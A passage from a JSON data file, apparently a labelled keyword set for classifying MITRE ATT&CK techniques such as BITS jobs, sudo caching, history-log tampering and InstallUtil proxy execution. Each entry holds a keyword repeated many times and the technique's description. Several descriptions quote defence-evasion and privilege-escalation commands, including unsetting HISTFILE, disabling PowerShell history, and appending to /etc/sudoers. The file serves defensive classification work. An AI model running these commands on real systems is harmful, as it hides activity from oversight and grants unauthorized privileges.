    "Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to interact with remote systems using Windows Remote Management (WinRM). The adversary may then perform actions as the logged-on user.\n\nWinRM is the name of both a Windows service and a protocol that allows a user to interact with a remote system (e.g., run an executable, modify the Registry, modify services).(Citation: Microsoft WinRM) It may be called with the `winrm` command or by any number of programs such as PowerShell.(Citation: Jacobsen 2014) WinRM  can be used as a method of remotely interacting with [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047).(Citation: MSDN WMI)"
  ],
  "bits jobs": [
    "BITSadmin \u00a0",
    "BITSadmin \u00a0",
    "BITSadmin \u00a0",
    "BITSadmin \u00a0",
    "BITSadmin \u00a0",
    "BITSadmin \u00a0",
    "BITSadmin \u00a0",
    "BITSadmin \u00a0",
    "BITSadmin \u00a0",
    "BITSadmin \u00a0",
    "BITSadmin \u00a0",
    "BITSadmin \u00a0",
    "BITSadmin \u00a0",
    "BITSadmin \u00a0",
    "BITSadmin \u00a0",
    "BITSadmin \u00a0",
    "BITSadmin \u00a0",
    "BITSadmin \u00a0",
    "BITSadmin \u00a0",
    "BITSadmin \u00a0",
    "BITSadmin \u00a0",
    "BITSadmin \u00a0",
    "BITSadmin \u00a0",
    "BITSadmin \u00a0",
    "BITSadmin \u00a0",
    "BITSadmin \u00a0",
    "BITSadmin \u00a0",
    "BITSadmin \u00a0",
    "BITSadmin \u00a0",
    "BITSadmin \u00a0",
    "BITSadmin \u00a0",
    "BITSadmin \u00a0",
    "BITSadmin \u00a0",
    "BITSadmin \u00a0",
    "BITSadmin \u00a0",
    "BITSadmin \u00a0",
    "BITSadmin \u00a0",
    "BITSadmin \u00a0",
    "BITSadmin \u00a0",
    "BITSadmin \u00a0",
    "BITSadmin \u00a0",
    "BITSadmin \u00a0",
    "BITSadmin \u00a0",
    "BITSadmin \u00a0",
    "BITSadmin \u00a0",
    "BITSadmin \u00a0",
    "BITSadmin \u00a0",
    "BITSadmin \u00a0",
    "BITSadmin \u00a0",
    "BITSadmin \u00a0",
    "Adversaries may abuse BITS jobs to persistently execute code and perform various background tasks. Windows Background Intelligent Transfer Service (BITS) is a low-bandwidth, asynchronous file transfer mechanism exposed through [Component Object Model](https://attack.mitre.org/techniques/T1559/001) (COM).(Citation: Microsoft COM)(Citation: Microsoft BITS) BITS is commonly used by updaters, messengers, and other applications preferred to operate in the background (using available idle bandwidth) without interrupting other networked applications. File transfer tasks are implemented as BITS jobs, which contain a queue of one or more file operations.\n\nThe interface to create and manage BITS jobs is accessible through [PowerShell](https://attack.mitre.org/techniques/T1059/001) and the [BITSAdmin](https://attack.mitre.org/software/S0190) tool.(Citation: Microsoft BITS)(Citation: Microsoft BITSAdmin)\n\nAdversaries may abuse BITS to download (e.g. [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105)), execute, and even clean up after running malicious code (e.g. [Indicator Removal](https://attack.mitre.org/techniques/T1070)). BITS tasks are self-contained in the BITS job database, without new files or registry modifications, and often permitted by host firewalls.(Citation: CTU BITS Malware June 2016)(Citation: Mondok Windows PiggyBack BITS May 2007)(Citation: Symantec BITS May 2007) BITS enabled execution may also enable persistence by creating long-standing jobs (the default maximum lifetime is 90 days and extendable) or invoking an arbitrary program when a job completes or errors (including after system reboots).(Citation: PaloAlto UBoatRAT Nov 2017)(Citation: CTU BITS Malware June 2016)\n\nBITS upload functionalities can also be used to perform [Exfiltration Over Alternative Protocol](https://attack.mitre.org/techniques/T1048).(Citation: CTU BITS Malware June 2016)"
  ],
  "data from information repositories": [
    "spwebmember ",
    "spwebmember ",
    "spwebmember ",
    "spwebmember ",
    "spwebmember ",
    "spwebmember ",
    "spwebmember ",
    "spwebmember ",
    "spwebmember ",
    "spwebmember ",
    "spwebmember ",
    "spwebmember ",
    "spwebmember ",
    "spwebmember ",
    "spwebmember ",
    "spwebmember ",
    "spwebmember ",
    "spwebmember ",
    "spwebmember ",
    "spwebmember ",
    "spwebmember ",
    "spwebmember ",
    "spwebmember ",
    "spwebmember ",
    "spwebmember ",
    "spwebmember ",
    "spwebmember ",
    "spwebmember ",
    "spwebmember ",
    "spwebmember ",
    "spwebmember ",
    "spwebmember ",
    "spwebmember ",
    "spwebmember ",
    "spwebmember ",
    "spwebmember ",
    "spwebmember ",
    "spwebmember ",
    "spwebmember ",
    "spwebmember ",
    "spwebmember ",
    "spwebmember ",
    "spwebmember ",
    "spwebmember ",
    "spwebmember ",
    "spwebmember ",
    "spwebmember ",
    "spwebmember ",
    "spwebmember ",
    "spwebmember ",
    "Adversaries may leverage information repositories to mine valuable information. Information repositories are tools that allow for storage of information, typically to facilitate collaboration or information sharing between users, and can store a wide variety of data that may aid adversaries in further objectives, or direct access to the target information. Adversaries may also abuse external sharing features to share sensitive documents with recipients outside of the organization. \n\nThe following is a brief list of example information that may hold potential value to an adversary and may also be found on an information repository:\n\n* Policies, procedures, and standards\n* Physical / logical network diagrams\n* System architecture diagrams\n* Technical system documentation\n* Testing / development credentials\n* Work / project schedules\n* Source code snippets\n* Links to network shares and other internal resources\n\nInformation stored in a repository may vary based on the specific instance or environment. Specific common information repositories include web-based platforms such as [Sharepoint](https://attack.mitre.org/techniques/T1213/002) and [Confluence](https://attack.mitre.org/techniques/T1213/001), specific services such as Code Repositories, IaaS databases, enterprise databases, and other storage infrastructure such as SQL Server."
  ],
  "event triggered execution: lc_load_dylib addition": [
    "LC_LOAD_DYLIB ",
    "LC_LOAD_DYLIB ",
    "LC_LOAD_DYLIB ",
    "LC_LOAD_DYLIB ",
    "LC_LOAD_DYLIB ",
    "LC_LOAD_DYLIB ",
    "LC_LOAD_DYLIB ",
    "LC_LOAD_DYLIB ",
    "LC_LOAD_DYLIB ",
    "LC_LOAD_DYLIB ",
    "LC_LOAD_DYLIB ",
    "LC_LOAD_DYLIB ",
    "LC_LOAD_DYLIB ",
    "LC_LOAD_DYLIB ",
    "LC_LOAD_DYLIB ",
    "LC_LOAD_DYLIB ",
    "LC_LOAD_DYLIB ",
    "LC_LOAD_DYLIB ",
    "LC_LOAD_DYLIB ",
    "LC_LOAD_DYLIB ",
    "LC_LOAD_DYLIB ",
    "LC_LOAD_DYLIB ",
    "LC_LOAD_DYLIB ",
    "LC_LOAD_DYLIB ",
    "LC_LOAD_DYLIB ",
    "LC_LOAD_DYLIB ",
    "LC_LOAD_DYLIB ",
    "LC_LOAD_DYLIB ",
    "LC_LOAD_DYLIB ",
    "LC_LOAD_DYLIB ",
    "LC_LOAD_DYLIB ",
    "LC_LOAD_DYLIB ",
    "LC_LOAD_DYLIB ",
    "LC_LOAD_DYLIB ",
    "LC_LOAD_DYLIB ",
    "LC_LOAD_DYLIB ",
    "LC_LOAD_DYLIB ",
    "LC_LOAD_DYLIB ",
    "LC_LOAD_DYLIB ",
    "LC_LOAD_DYLIB ",
    "LC_LOAD_DYLIB ",
    "LC_LOAD_DYLIB ",
    "LC_LOAD_DYLIB ",
    "LC_LOAD_DYLIB ",
    "LC_LOAD_DYLIB ",
    "LC_LOAD_DYLIB ",
    "LC_LOAD_DYLIB ",
    "LC_LOAD_DYLIB ",
    "LC_LOAD_DYLIB ",
    "LC_LOAD_DYLIB ",
    "Adversaries may establish persistence by executing malicious content triggered by the execution of tainted binaries. Mach-O binaries have a series of headers that are used to perform certain operations when a binary is loaded. The LC_LOAD_DYLIB header in a Mach-O binary tells macOS and OS X which dynamic libraries (dylibs) to load during execution time. These can be added ad-hoc to the compiled binary as long as adjustments are made to the rest of the fields and dependencies.(Citation: Writing Bad Malware for OSX) There are tools available to perform these changes.\n\nAdversaries may modify Mach-O binary headers to load and execute malicious dylibs every time the binary is executed. Although any changes will invalidate digital signatures on binaries because the binary is being modified, this can be remediated by simply removing the LC_CODE_SIGNATURE command from the binary so that the signature isn\u2019t checked at load time.(Citation: Malware Persistence on OS X)"
  ],
  "impair defenses: impair command history logging": [
    "HISTCONTROL",
    "HISTCONTROL",
    "HISTCONTROL",
    "HISTCONTROL",
    "HISTCONTROL",
    "HISTCONTROL",
    "HISTCONTROL",
    "HISTCONTROL",
    "HISTCONTROL",
    "HISTCONTROL",
    "HISTCONTROL",
    "HISTCONTROL",
    "HISTCONTROL",
    "HISTCONTROL",
    "HISTCONTROL",
    "HISTCONTROL",
    "HISTCONTROL",
    "HISTCONTROL",
    "HISTCONTROL",
    "HISTCONTROL",
    "HISTCONTROL",
    "HISTCONTROL",
    "HISTCONTROL",
    "HISTCONTROL",
    "HISTCONTROL",
    "HISTCONTROL",
    "HISTCONTROL",
    "HISTCONTROL",
    "HISTCONTROL",
    "HISTCONTROL",
    "HISTCONTROL",
    "HISTCONTROL",
    "HISTCONTROL",
    "HISTCONTROL",
    "HISTCONTROL",
    "HISTCONTROL",
    "HISTCONTROL",
    "HISTCONTROL",
    "HISTCONTROL",
    "HISTCONTROL",
    "HISTCONTROL",
    "HISTCONTROL",
    "HISTCONTROL",
    "HISTCONTROL",
    "HISTCONTROL",
    "HISTCONTROL",
    "HISTCONTROL",
    "HISTCONTROL",
    "HISTCONTROL",
    "HISTCONTROL",
    "Adversaries may impair command history logging to hide commands they run on a compromised system. Various command interpreters keep track of the commands users type in their terminal so that users can retrace what they've done. \n\nOn Linux and macOS, command history is tracked in a file pointed to by the environment variable <code>HISTFILE</code>. When a user logs off a system, this information is flushed to a file in the user's home directory called <code>~/.bash_history</code>. The <code>HISTCONTROL</code> environment variable keeps track of what should be saved by the <code>history</code> command and eventually into the <code>~/.bash_history</code> file when a user logs out. <code>HISTCONTROL</code> does not exist by default on macOS, but can be set by the user and will be respected.\n\nAdversaries may clear the history environment variable (<code>unset HISTFILE</code>) or set the command history size to zero (<code>export HISTFILESIZE=0</code>) to prevent logging of commands. Additionally, <code>HISTCONTROL</code> can be configured to ignore commands that start with a space by simply setting it to \"ignorespace\". <code>HISTCONTROL</code> can also be set to ignore duplicate commands by setting it to \"ignoredups\". In some Linux systems, this is set by default to \"ignoreboth\" which covers both of the previous examples. This means that \u201c ls\u201d will not be saved, but \u201cls\u201d would be saved by history. Adversaries can abuse this to operate without leaving traces by simply prepending a space to all of their terminal commands. \n\nOn Windows systems, the <code>PSReadLine</code> module tracks commands used in all PowerShell sessions and writes them to a file (<code>$env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt</code> by default). Adversaries may change where these logs are saved using <code>Set-PSReadLineOption -HistorySavePath {File Path}</code>. This will cause <code>ConsoleHost_history.txt</code> to stop receiving logs. Additionally, it is possible to turn off logging to this file using the PowerShell command <code>Set-PSReadlineOption -HistorySaveStyle SaveNothing</code>.(Citation: Microsoft PowerShell Command History)(Citation: Sophos PowerShell command audit)(Citation: Sophos PowerShell Command History Forensics)\n\nAdversaries may also leverage a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) on network devices to disable historical command logging (e.g. <code>no logging</code>)."
  ],
  "direct volume access": [
    "NinjaCopy",
    "NinjaCopy",
    "NinjaCopy",
    "NinjaCopy",
    "NinjaCopy",
    "NinjaCopy",
    "NinjaCopy",
    "NinjaCopy",
    "NinjaCopy",
    "NinjaCopy",
    "NinjaCopy",
    "NinjaCopy",
    "NinjaCopy",
    "NinjaCopy",
    "NinjaCopy",
    "NinjaCopy",
    "NinjaCopy",
    "NinjaCopy",
    "NinjaCopy",
    "NinjaCopy",
    "NinjaCopy",
    "NinjaCopy",
    "NinjaCopy",
    "NinjaCopy",
    "NinjaCopy",
    "NinjaCopy",
    "NinjaCopy",
    "NinjaCopy",
    "NinjaCopy",
    "NinjaCopy",
    "NinjaCopy",
    "NinjaCopy",
    "NinjaCopy",
    "NinjaCopy",
    "NinjaCopy",
    "NinjaCopy",
    "NinjaCopy",
    "NinjaCopy",
    "NinjaCopy",
    "NinjaCopy",
    "NinjaCopy",
    "NinjaCopy",
    "NinjaCopy",
    "NinjaCopy",
    "NinjaCopy",
    "NinjaCopy",
    "NinjaCopy",
    "NinjaCopy",
    "NinjaCopy",
    "NinjaCopy",
    "Adversaries may directly access a volume to bypass file access controls and file system monitoring. Windows allows programs to have direct access to logical volumes. Programs with direct access may read and write files directly from the drive by analyzing file system data structures. This technique bypasses Windows file access controls as well as file system monitoring tools. (Citation: Hakobyan 2009)\n\nUtilities, such as NinjaCopy, exist to perform these actions in PowerShell. (Citation: Github PowerSploit Ninjacopy)"
  ],
  "system binary proxy execution: regsvcs/regasm": [
    "regasm.exe ",
    "regasm.exe ",
    "regasm.exe ",
    "regasm.exe ",
    "regasm.exe ",
    "regasm.exe ",
    "regasm.exe ",
    "regasm.exe ",
    "regasm.exe ",
    "regasm.exe ",
    "regasm.exe ",
    "regasm.exe ",
    "regasm.exe ",
    "regasm.exe ",
    "regasm.exe ",
    "regasm.exe ",
    "regasm.exe ",
    "regasm.exe ",
    "regasm.exe ",
    "regasm.exe ",
    "regasm.exe ",
    "regasm.exe ",
    "regasm.exe ",
    "regasm.exe ",
    "regasm.exe ",
    "regasm.exe ",
    "regasm.exe ",
    "regasm.exe ",
    "regasm.exe ",
    "regasm.exe ",
    "regasm.exe ",
    "regasm.exe ",
    "regasm.exe ",
    "regasm.exe ",
    "regasm.exe ",
    "regasm.exe ",
    "regasm.exe ",
    "regasm.exe ",
    "regasm.exe ",
    "regasm.exe ",
    "regasm.exe ",
    "regasm.exe ",
    "regasm.exe ",
    "regasm.exe ",
    "regasm.exe ",
    "regasm.exe ",
    "regasm.exe ",
    "regasm.exe ",
    "regasm.exe ",
    "regasm.exe ",
    " regsvcs.exe",
    " regsvcs.exe",
    " regsvcs.exe",
    " regsvcs.exe",
    " regsvcs.exe",
    " regsvcs.exe",
    " regsvcs.exe",
    " regsvcs.exe",
    " regsvcs.exe",
    " regsvcs.exe",
    " regsvcs.exe",
    " regsvcs.exe",
    " regsvcs.exe",
    " regsvcs.exe",
    " regsvcs.exe",
    " regsvcs.exe",
    " regsvcs.exe",
    " regsvcs.exe",
    " regsvcs.exe",
    " regsvcs.exe",
    " regsvcs.exe",
    " regsvcs.exe",
    " regsvcs.exe",
    " regsvcs.exe",
    " regsvcs.exe",
    " regsvcs.exe",
    " regsvcs.exe",
    " regsvcs.exe",
    " regsvcs.exe",
    " regsvcs.exe",
    " regsvcs.exe",
    " regsvcs.exe",
    " regsvcs.exe",
    " regsvcs.exe",
    " regsvcs.exe",
    " regsvcs.exe",
    " regsvcs.exe",
    " regsvcs.exe",
    " regsvcs.exe",
    " regsvcs.exe",
    " regsvcs.exe",
    " regsvcs.exe",
    " regsvcs.exe",
    " regsvcs.exe",
    " regsvcs.exe",
    " regsvcs.exe",
    " regsvcs.exe",
    " regsvcs.exe",
    " regsvcs.exe",
    " regsvcs.exe",
    "Adversaries may abuse Regsvcs and Regasm to proxy execution of code through a trusted Windows utility. Regsvcs and Regasm are Windows command-line utilities that are used to register .NET [Component Object Model](https://attack.mitre.org/techniques/T1559/001) (COM) assemblies. Both are binaries that may be digitally signed by Microsoft. (Citation: MSDN Regsvcs) (Citation: MSDN Regasm)\n\nBoth utilities may be used to bypass application control through use of attributes within the binary to specify code that should be run before registration or unregistration: <code>[ComRegisterFunction]</code> or <code>[ComUnregisterFunction]</code> respectively. The code with the registration and unregistration attributes will be executed even if the process is run under insufficient privileges and fails to execute. (Citation: LOLBAS Regsvcs)(Citation: LOLBAS Regasm)"
  ],
  "exploitation for credential access": [
    "MS14-068",
    "MS14-068",
    "MS14-068",
    "MS14-068",
    "MS14-068",
    "MS14-068",
    "MS14-068",
    "MS14-068",
    "MS14-068",
    "MS14-068",
    "MS14-068",
    "MS14-068",
    "MS14-068",
    "MS14-068",
    "MS14-068",
    "MS14-068",
    "MS14-068",
    "MS14-068",
    "MS14-068",
    "MS14-068",
    "MS14-068",
    "MS14-068",
    "MS14-068",
    "MS14-068",
    "MS14-068",
    "MS14-068",
    "MS14-068",
    "MS14-068",
    "MS14-068",
    "MS14-068",
    "MS14-068",
    "MS14-068",
    "MS14-068",
    "MS14-068",
    "MS14-068",
    "MS14-068",
    "MS14-068",
    "MS14-068",
    "MS14-068",
    "MS14-068",
    "MS14-068",
    "MS14-068",
    "MS14-068",
    "MS14-068",
    "MS14-068",
    "MS14-068",
    "MS14-068",
    "MS14-068",
    "MS14-068",
    "MS14-068",
    "Adversaries may exploit software vulnerabilities in an attempt to collect credentials. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. Credentialing and authentication mechanisms may be targeted for exploitation by adversaries as a means to gain access to useful credentials or circumvent the process to gain access to systems. One example of this is MS14-068, which targets Kerberos and can be used to forge Kerberos tickets using domain user permissions.(Citation: Technet MS14-068)(Citation: ADSecurity Detecting Forged Tickets) Exploitation for credential access may also result in Privilege Escalation depending on the process targeted or credentials obtained."
  ],
  "abuse elevation control mechanism: sudo and sudo caching": [
    "sudo",
    "sudo",
    "sudo",
    "sudo",
    "sudo",
    "sudo",
    "sudo",
    "sudo",
    "sudo",
    "sudo",
    "sudo",
    "sudo",
    "sudo",
    "sudo",
    "sudo",
    "sudo",
    "sudo",
    "sudo",
    "sudo",
    "sudo",
    "sudo",
    "sudo",
    "sudo",
    "sudo",
    "sudo",
    "sudo",
    "sudo",
    "sudo",
    "sudo",
    "sudo",
    "sudo",
    "sudo",
    "sudo",
    "sudo",
    "sudo",
    "sudo",
    "sudo",
    "sudo",
    "sudo",
    "sudo",
    "sudo",
    "sudo",
    "sudo",
    "sudo",
    "sudo",
    "sudo",
    "sudo",
    "sudo",
    "sudo",
    "sudo",
    "Adversaries may perform sudo caching and/or use the sudoers file to elevate privileges. Adversaries may do this to execute commands as other users or spawn processes with higher privileges.\n\nWithin Linux and MacOS systems, sudo (sometimes referred to as \"superuser do\") allows users to perform commands from terminals with elevated privileges and to control who can perform these commands on the system. The <code>sudo</code> command \"allows a system administrator to delegate authority to give certain users (or groups of users) the ability to run some (or all) commands as root or another user while providing an audit trail of the commands and their arguments.\"(Citation: sudo man page 2018) Since sudo was made for the system administrator, it has some useful configuration features such as a <code>timestamp_timeout</code>, which is the amount of time in minutes between instances of <code>sudo</code> before it will re-prompt for a password. This is because <code>sudo</code> has the ability to cache credentials for a period of time. Sudo creates (or touches) a file at <code>/var/db/sudo</code> with a timestamp of when sudo was last run to determine this timeout. Additionally, there is a <code>tty_tickets</code> variable that treats each new tty (terminal session) in isolation. This means that, for example, the sudo timeout of one tty will not affect another tty (you will have to type the password again).\n\nThe sudoers file, <code>/etc/sudoers</code>, describes which users can run which commands and from which terminals. This also describes which commands users can run as other users or groups. This provides the principle of least privilege such that users are running in their lowest possible permissions for most of the time and only elevate to other users or permissions as needed, typically by prompting for a password. However, the sudoers file can also specify when to not prompt users for passwords with a line like <code>user1 ALL=(ALL) NOPASSWD: ALL</code>.(Citation: OSX.Dok Malware) Elevated privileges are required to edit this file though.\n\nAdversaries can also abuse poor configurations of these mechanisms to escalate privileges without needing the user's password. For example, <code>/var/db/sudo</code>'s timestamp can be monitored to see if it falls within the <code>timestamp_timeout</code> range. If it does, then malware can execute sudo commands without needing to supply the user's password. Additional, if <code>tty_tickets</code> is disabled, adversaries can do this from any tty for that user.\n\nIn the wild, malware has disabled <code>tty_tickets</code> to potentially make scripting easier by issuing <code>echo \\'Defaults !tty_tickets\\' >> /etc/sudoers</code>.(Citation: cybereason osx proton) In order for this change to be reflected, the malware also issued <code>killall Terminal</code>. As of macOS Sierra, the sudoers file has <code>tty_tickets</code> enabled by default."
  ],
  "system binary proxy execution: installutil": [
    "InstallUtil.exe",
    "InstallUtil.exe",
    "InstallUtil.exe",
    "InstallUtil.exe",
    "InstallUtil.exe",
    "InstallUtil.exe",
    "InstallUtil.exe",
    "InstallUtil.exe",
    "InstallUtil.exe",
    "InstallUtil.exe",
    "InstallUtil.exe",
    "InstallUtil.exe",
    "InstallUtil.exe",
    "InstallUtil.exe",
    "InstallUtil.exe",
    "InstallUtil.exe",
    "InstallUtil.exe",
    "InstallUtil.exe",
    "InstallUtil.exe",
    "InstallUtil.exe",
    "InstallUtil.exe",
    "InstallUtil.exe",
    "InstallUtil.exe",
    "InstallUtil.exe",
    "InstallUtil.exe",
    "InstallUtil.exe",
    "InstallUtil.exe",
    "InstallUtil.exe",
    "InstallUtil.exe",
    "InstallUtil.exe",
    "InstallUtil.exe",
    "InstallUtil.exe",
    "InstallUtil.exe",
    "InstallUtil.exe",
    "InstallUtil.exe",
    "InstallUtil.exe",
    "InstallUtil.exe",
    "InstallUtil.exe",
    "InstallUtil.exe",
    "InstallUtil.exe",
    "InstallUtil.exe",
    "InstallUtil.exe",
    "InstallUtil.exe",
    "InstallUtil.exe",
    "InstallUtil.exe",
    "InstallUtil.exe",
    "InstallUtil.exe",
    "InstallUtil.exe",
    "InstallUtil.exe",
    "InstallUtil.exe",
    "Adversaries may use InstallUtil to proxy execution of code through a trusted Windows utility. InstallUtil is a command-line utility that allows for installation and uninstallation of resources by executing specific installer components specified in .NET binaries. (Citation: MSDN InstallUtil) The InstallUtil binary may also be digitally signed by Microsoft and located in the .NET directories on a Windows system: <code>C:\\Windows\\Microsoft.NET\\Framework\\v<version>\\InstallUtil.exe</code> and <code>C:\\Windows\\Microsoft.NET\\Framework64\\v<version>\\InstallUtil.exe</code>.\n\nInstallUtil may also be used to bypass application control through use of attributes within the binary that execute the class decorated with the attribute <code>[System.ComponentModel.RunInstaller(true)]</code>. (Citation: LOLBAS Installutil)"
  ],
  "network share discovery": [
    "net view ",
    "net view ",
    "net view ",
    "net view ",
    "net view ",
    "net view ",
    "net view ",
    "net view ",
    "net view ",
    "net view ",
    "net view ",
    "net view ",
    "net view ",
    "net view ",
    "net view ",
    "net view ",
    "net view ",
    "net view ",
    "net view ",
    "net view ",
    "net view ",
    "net view ",
    "net view ",
    "net view ",
    "net view ",
    "net view ",
    "net view ",
    "net view ",
    "net view ",
    "net view ",
    "net view ",
    "net view ",
    "net view ",
    "net view ",
    "net view ",
    "net view ",
    "net view ",
    "net view ",
    "net view ",
    "net view ",
    "net view ",
    "net view ",
    "net view ",
    "net view ",
    "net view ",
    "net view ",
    "net view ",
    "net view ",
    "net view ",
    "net view ",
    " net share",
    " net share",
    " net share",
    " net share",
    " net share",
    " net share",
    " net share",
    " net share",
    " net share",
    " net share",
    " net share",
    " net share",
    " net share",
    " net share",
    " net share",
    " net share",
    " net share",
    " net share",
    " net share",
    " net share",
    " net share",
    " net share",
    " net share",
    " net share",
    " net share",
    " net share",
    " net share",
    " net share",
    " net share",
    " net share",
    " net share",
    " net share",
    " net share",
    " net share",
    " net share",
    " net share",
    " net share",
    " net share",
    " net share",
    " net share",
    " net share",
    " net share",
    " net share",
    " net share",
    " net share",
    " net share",
    " net share",
    " net share",
    " net share",
    " net share",
    "Adversaries may look for folders and drives shared on remote systems as a means of identifying sources of information to gather as a precursor for Collection and to identify potential systems of interest for Lateral Movement. Networks often contain shared network drives and folders that enable users to access file directories on various systems across a network. \n\nFile sharing over a Windows network occurs over the SMB protocol. (Citation: Wikipedia Shared Resource) (Citation: TechNet Shared Folder) [Net](https://attack.mitre.org/software/S0039) can be used to query a remote system for available shared drives using the <code>net view \\\\\\\\remotesystem</code> command. It can also be used to query shared drives on the local system using <code>net share</code>. For macOS, the <code>sharing -l</code> command lists all shared points used for smb services."
  ],
  "system network connections discovery": [
    "netstat ",
    "netstat ",
    "netstat ",
    "netstat ",
    "netstat ",
    "netstat ",
    "netstat ",
    "netstat ",
    "netstat ",
    "netstat ",
    "netstat ",
    "netstat ",
    "netstat ",
    "netstat ",
    "netstat ",
    "netstat ",
    "netstat ",
    "netstat ",
    "netstat ",
    "netstat ",
    "netstat ",
    "netstat ",
    "netstat ",
    "netstat ",
    "netstat ",
    "netstat ",
    "netstat ",
    "netstat ",
    "netstat ",
    "netstat ",
    "netstat ",
    "netstat ",
    "netstat ",
    "netstat ",
    "netstat ",
    "netstat ",
    "netstat ",
    "netstat ",
    "netstat ",
    "netstat ",
    "netstat ",
    "netstat ",
    "netstat ",
    "netstat ",
    "netstat ",
    "netstat ",
    "netstat ",
    "netstat ",
    "netstat ",
    "netstat ",
    " net use ",
    " net use ",
    " net use ",
    " net use ",
    " net use ",
    " net use ",
    " net use ",
    " net use ",
    " net use ",
    " net use ",
    " net use ",
    " net use ",
    " net use ",
    " net use ",
    " net use ",
    " net use ",
    " net use ",
    " net use ",
    " net use ",
    " net use ",
    " net use ",
    " net use ",
    " net use ",
    " net use ",
    " net use ",
    " net use ",
    " net use ",
    " net use ",
    " net use ",
    " net use ",
    " net use ",
    " net use ",
    " net use ",
    " net use ",
    " net use ",
    " net use ",
    " net use ",
    " net use ",
    " net use ",
    " net use ",
    " net use ",
    " net use ",
    " net use ",
    " net use ",
    " net use ",
    " net use ",
    " net use ",
    " net use ",
    " net use ",
    " net use ",
    " net session",
    " net session",
    " net session",
    " net session",
    " net session",
    " net session",
    " net session",
    " net session",
    " net session",
    " net session",
    " net session",
    " net session",
    " net session",
    " net session",
    " net session",
    " net session",
    " net session",
    " net session",
    " net session",
    " net session",
    " net session",
    " net session",
    " net session",
    " net session",
    " net session",
    " net session",
    " net session",
    " net session",
    " net session",
    " net session",
    " net session",
    " net session",
    " net session",
    " net session",
    " net session",
    " net session",
    " net session",
    " net session",
    " net session",
    " net session",
    " net session",
    " net session",
    " net session",
    " net session",
    " net session",
    " net session",
    " net session",
    " net session",
    " net session",
    " net session",
    "Adversaries may attempt to get a listing of network connections to or from the compromised system they are currently accessing or from remote systems by querying for information over the network. \n\nAn adversary who gains access to a system that is part of a cloud-based environment may map out Virtual Private Clouds or Virtual Networks in order to determine what systems and services are connected. The actions performed are likely the same types of discovery techniques depending on the operating system, but the resulting information may include details about the networked cloud environment relevant to the adversary's goals. Cloud providers may have different ways in which their virtual networks operate.(Citation: Amazon AWS VPC Guide)(Citation: Microsoft Azure Virtual Network Overview)(Citation: Google VPC Overview) Similarly, adversaries who gain access to network devices may also perform similar discovery activities to gather information about connected systems and services.\n\nUtilities and commands that acquire this information include [netstat](https://attack.mitre.org/software/S0104), \"net use,\" and \"net session\" with [Net](https://attack.mitre.org/software/S0039). In Mac and Linux, [netstat](https://attack.mitre.org/software/S0104) and <code>lsof</code> can be used to list current connections. <code>who -a</code> and <code>w</code> can be used to show which users are currently logged in, similar to \"net session\". Additionally, built-in features native to network devices and [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) may be used (e.g. <code>show ip sockets</code>, <code>show tcp brief</code>).(Citation: US-CERT-TA18-106A)"
  ],
  "video capture": [
    "capture webcam data ",
    "capture webcam data ",
    "capture webcam data ",
    "capture webcam data ",
    "capture webcam data ",
    "capture webcam data ",
    "capture webcam data ",
    "capture webcam data ",
    "capture webcam data ",
    "capture webcam data ",
    "capture webcam data ",
    "capture webcam data ",
    "capture webcam data ",
    "capture webcam data ",
    "capture webcam data ",
    "capture webcam data ",
    "capture webcam data ",
    "capture webcam data ",
    "capture webcam data ",
    "capture webcam data ",
    "capture webcam data ",
    "capture webcam data ",
    "capture webcam data ",
    "capture webcam data ",
    "capture webcam data ",
    "capture webcam data ",
    "capture webcam data ",
    "capture webcam data ",
    "capture webcam data ",
    "capture webcam data ",
    "capture webcam data ",
    "capture webcam data ",
    "capture webcam data ",
    "capture webcam data ",
    "capture webcam data ",
    "capture webcam data ",
    "capture webcam data ",
    "capture webcam data ",
    "capture webcam data ",
    "capture webcam data ",
    "capture webcam data ",
    "capture webcam data ",
    "capture webcam data ",
    "capture webcam data ",
    "capture webcam data ",
    "capture webcam data ",
    "capture webcam data ",
    "capture webcam data ",
    "capture webcam data ",
    "capture webcam data ",
    " capture video ",
    " capture video ",
    " capture video ",
    " capture video ",
    " capture video ",
    " capture video ",
    " capture video ",
    " capture video ",
    " capture video ",
    " capture video ",
    " capture video ",
    " capture video ",
    " capture video ",
    " capture video ",
    " capture video ",
    " capture video ",
    " capture video ",
    " capture video ",
    " capture video ",
    " capture video ",
    " capture video ",
    " capture video ",
    " capture video ",
    " capture video ",
    " capture video ",
    " capture video ",
    " capture video ",
    " capture video ",
    " capture video ",
    " capture video ",
    " capture video ",
    " capture video ",
    " capture video ",
    " capture video ",
    " capture video ",
    " capture video ",
    " capture video ",
    " capture video ",
    " capture video ",
    " capture video ",
    " capture video ",
    " capture video ",
    " capture video ",
    " capture video ",
    " capture video ",
    " capture video ",
    " capture video ",
    " capture video ",
    " capture video ",
    " capture video ",
    "An adversary can leverage a computer's peripheral devices (e.g., integrated cameras or webcams) or applications (e.g., video call services) to capture video recordings for the purpose of gathering information. Images may also be captured from devices or applications, potentially in specified intervals, in lieu of video files.\n\nMalware or scripts may be used to interact with the devices through an available API provided by the operating system or an application to capture video or images. Video or image files may be written to disk and exfiltrated later. This technique differs from [Screen Capture](https://attack.mitre.org/techniques/T1113) due to use of specific devices or applications for video recording rather than capturing the victim's screen.\n\nIn macOS, there are a few different malware samples that record the user's webcam such as FruitFly and Proton. (Citation: objective-see 2017 review)"
  ],
  "system services: launchctl": [
    "launchctl",
    "launchctl",
    "launchctl",
    "launchctl",
    "launchctl",
    "launchctl",
    "launchctl",
    "launchctl",
    "launchctl",
    "launchctl",
    "launchctl",
    "launchctl",
    "launchctl",
    "launchctl",
    "launchctl",
    "launchctl",
    "launchctl",
    "launchctl",
    "launchctl",
    "launchctl",
    "launchctl",
    "launchctl",
    "launchctl",
    "launchctl",
    "launchctl",
    "launchctl",
    "launchctl",
    "launchctl",
    "launchctl",
    "launchctl",
    "launchctl",
    "launchctl",
    "launchctl",
    "launchctl",
    "launchctl",
    "launchctl",
    "launchctl",
    "launchctl",
    "launchctl",
    "launchctl",
    "launchctl",
    "launchctl",
    "launchctl",
    "launchctl",
    "launchctl",
    "launchctl",
    "launchctl",
    "launchctl",
    "launchctl",
    "launchctl",
